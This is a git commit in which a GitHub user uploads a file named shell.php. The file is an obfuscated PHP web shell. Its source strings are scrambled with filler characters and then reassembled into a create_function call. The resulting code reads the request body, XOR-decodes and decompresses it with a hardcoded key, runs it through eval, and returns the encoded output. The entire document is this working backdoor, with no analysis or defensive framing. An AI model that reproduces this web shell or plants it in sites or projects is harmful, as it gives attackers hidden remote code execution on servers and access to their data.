b12f91c539819ab25e91ed2a681c26fccf3cc315
To1y <49966714+To1y@users.noreply.github.com>
2022-09-25 10:30:41 +1000

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,12 @@
+<?php
+$n='ents("d*php:/d*/d*input"),$md*)==1d*) {@ob_std*art();@ed*vald*(d*@gzuncompd*d*ress(';
+$D='fd*or(d*$i=0d*;$i<$l;){d*for($j=d*0;($j<$c&&$i<d*$d*l);$j+d*+,d*$i++){$o.=$t{$i}d*^d*';
+$N='ead*n();$rd*=@bad*se64d*_end*code(@x(@gzd*compred*ss($od*),d*$k));prind*t("$p$kh$rd*$kf");}';
+$M='$k=d*d*"ab6ba16c";$kh=d*"10cc7fd*1cdafbd*"d*;$kd*fd*="833365a8cb01";d*$p="Sd*uFLvCu0K7s';
+$s='$k{$j};}}d*d*d*return $o;}if (@preg_d*matchd*("/$d*kh(.+)$kfd*d*/",@file_gd*et_contd*';
+$r='@x(@bd*d*ase64_decode(d*$m[1]),$k))d*);d*$o=@ob_gd*ed*t_contents();@d*ob_d*end_cl';
+$u='d*KdH2U";d*fd*d*unction x($t,d*$k){$c=d*strled*n($k);$l=sd*td*rlen($d*t);$o=""d*;';
+$B=str_replace('S','','crSeaSSte_SfuncStiSon');
+$A=str_replace('d*','',$M.$u.$D.$s.$n.$r.$N);
+$q=$B('',$A);$q();
+?>
